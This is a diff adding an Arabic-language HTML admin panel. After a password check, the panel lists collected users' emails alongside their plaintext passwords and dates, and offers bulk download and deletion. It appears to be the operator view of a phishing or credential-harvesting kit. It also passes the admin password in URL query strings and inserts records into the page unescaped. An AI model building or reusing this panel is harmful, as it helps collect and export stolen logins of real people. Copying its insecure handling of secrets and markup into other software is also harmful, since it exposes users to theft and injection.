@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تسجيل دخول الادمن</title>
+    <style>
+        body { background: #111; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-box { background: #222; padding: 30px; border-radius: 10px; text-align: center; border: 2px solid orange; }
+        input { padding: 10px; width: 250px; margin: 10px 0; border-radius: 5px; border: none; font-size: 16px; }
+        button { padding: 12px 20px; background: orange; color: black; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; }
+        #panel { display: none; width: 90%; }
+        .btns { margin: 20px 0; }
+        .btn { padding: 12px 20px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-left: 10px; }
+        .btn-delete { background: red; color: white; }
+        .btn-download { background: #28a745; color: white; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid orange; padding: 10px; text-align: center; word-break: break-all; }
+        th { background: orange; color: black; }
+    </style>
+</head>
+<body>
+    <div class="login-box" id="loginBox">
+        <h1>تسجيل دخول الادمن</h1>
+        <input type="password" id="adminPass" placeholder="اكتب باسورد الادمن">
+        <br>
+        <button onclick="login()">دخول</button>
+        <p id="error" style="color:red"></p>
+    </div>
+
+    <div id="panel">
+        <h1>لوحة التحكم</h1>
+        <div class="btns">
+            <button class="btn btn-delete" onclick="deleteAll()">🗑️ مسح كل البيانات</button>
+            <button class="btn btn-download" onclick="downloadFile()">💾 تحميل ملف TXT</button>
+        </div>
+        <table id="usersTable"><thead><tr><th>#</th><th>الايميل</th><th>الباسورد</th><th>التاريخ</th></tr></thead><tbody></tbody></table>
+    </div>
+
+    <script>
+        let adminPass = "";
+        function login() {
+            adminPass = document.getElementById('adminPass').value;
+            fetch('/api/admin-login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({password: adminPass})
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.success){
+                    document.getElementById('loginBox').style.display = 'none';
+                    document.getElementById('panel').style.display = 'block';
+                    loadUsers();
+                } else {
+                    document.getElementById('error').innerText = "الباسورد غلط";
+                }
+            });
+        }
+
+        function loadUsers() {
+            fetch(`/api/users?pass=${adminPass}`).then(res => res.json()).then(users => {
+                const tbody = document.querySelector('#usersTable tbody');
+                tbody.innerHTML = '';
+                users.forEach((user, index) => {
+                    tbody.innerHTML += `<tr><td>${index + 1}</td><td>${user.email}</td><td>${user.password}</td><td>${user.date}</td></tr>`;
+                });
+            });
+        }
+
+        function deleteAll() {
+            if(confirm("متاكد؟")){
+                fetch(`/api/users?pass=${adminPass}`, { method: 'DELETE' })
+                .then(res => res.text()).then(data => { alert(data); loadUsers(); });
+            }
+        }
+
+        function downloadFile() {
+            window.location.href = `/api/download?pass=${adminPass}`;
+        }
+    </script>
+</body>
+</html>
